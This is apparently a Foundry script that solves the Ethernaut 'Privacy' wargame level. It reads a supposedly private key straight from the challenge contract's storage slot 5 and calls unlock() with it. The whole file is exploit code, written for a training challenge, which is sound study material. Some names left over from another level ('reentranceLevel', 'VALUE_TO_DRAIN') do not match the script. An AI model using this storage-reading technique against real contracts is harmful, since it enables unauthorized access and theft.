// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Privacy} from "../src/12-Privacy.sol";
import {PrivacyFactory} from "../src/PrivacyFactory.sol";
import {Script, console} from "forge-std/Script.sol";

contract PrivacySolution is Script {
    Privacy public reentranceLevel;
    address payable instanceAddress =
        payable(0x1f97711151827742820DC94D8334F5156554091F);
    address public publicKey = vm.envAddress("PUBLIC_KEY");
    uint256 public constant VALUE_TO_DRAIN = 0.001 ether;

    function run() external {
        reentranceLevel = Privacy(instanceAddress);

        bytes32 dataRaw = vm.load(instanceAddress, bytes32(uint256(5)));
        bytes16 key = bytes16(dataRaw);

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        reentranceLevel.unlock(key);
        vm.stopBroadcast();
        validate();
    }

    function validate() internal {
        bool isValidated = new PrivacyFactory().validateInstance(
            instanceAddress,
            publicKey
        );
        console.log("Challenge Completed: %s", isValidated);
    }
}

contract Attacker {}
